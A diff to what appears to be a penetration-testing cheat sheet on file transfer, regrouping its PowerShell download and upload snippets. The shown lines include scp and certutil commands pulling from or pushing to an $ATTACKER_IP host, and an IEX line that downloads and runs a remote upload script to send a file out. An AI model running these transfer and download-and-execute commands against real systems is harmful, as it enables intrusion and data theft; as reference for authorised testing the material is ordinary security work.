@@ -96,17 +96,19 @@ scp /path/to/file user@$ATTACKER_IP:/path/to/dir
 
 ## PowerShell
 
-### Download
+::: code-group
 
-```powershell
+```powershell [download]
 (New-Object Net.WebClient).DownloadFile('$URL','<output_file>')
+
+certutil.exe -urlcache -split -f "http://$ATTACKER_IP:$ATTACKER_PORT/filename" filename
 ```
 
-### Upload
-
-```powershell
+```powershell [upload]
 IEX(New-Object Net.WebClient).DownloadString('<https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1>') Invoke-FileUpload -Uri $URL -File <file>
 ```
+
+:::
 
 ## Linux
 
